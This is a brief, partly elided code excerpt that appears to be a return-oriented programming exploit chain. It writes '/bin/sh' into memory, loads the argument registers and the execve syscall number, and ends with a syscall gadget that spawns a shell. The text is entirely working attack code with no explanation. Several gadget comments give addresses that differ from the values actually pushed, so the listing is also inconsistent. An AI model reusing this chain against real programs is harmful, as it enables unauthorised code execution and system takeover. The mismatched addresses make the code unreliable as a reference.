...
add_gadget(0x018b074f) // 0x02118aef: pop r14; ret;
set_reg(idx++, 0x6e69622f);
set_reg(idx++, 0x0068732f);
add_gadget(0x00d8e669); // 0x00d8e669: pop rax; ret; 
add_gadget(0x03ddd000);
add_gadget(0x031972b1); // 0x031974a1: mov qword ptr [rax], r14; pop rbx; pop r14; pop rbp; ret; 
...
set_reg(idx++, 0xdeadbeef);
set_reg(idx++, 0xdeadbeef);
add_gadget(0x00efb921); // 0x00efb921: pop rdi; ret; 
add_gadget(0x03ddd000);
add_gadget(0x00b5559e); // 0x00b5559e: pop rsi; ret; 
add_gadget(0x03ddd008);
add_gadget(0x00efbe3f); // 0x00efbe3f: pop rdx; ret; 
add_gadget(0x03ddd008);
add_gadget(0x00d8e669); // 0x00d8e669: pop rax; ret; 
set_reg(idx++, 0x0000003b);
set_reg(idx++, 0);
add_gadget(0x01cfd7f8); // 0x00a00481: syscall; 
success();
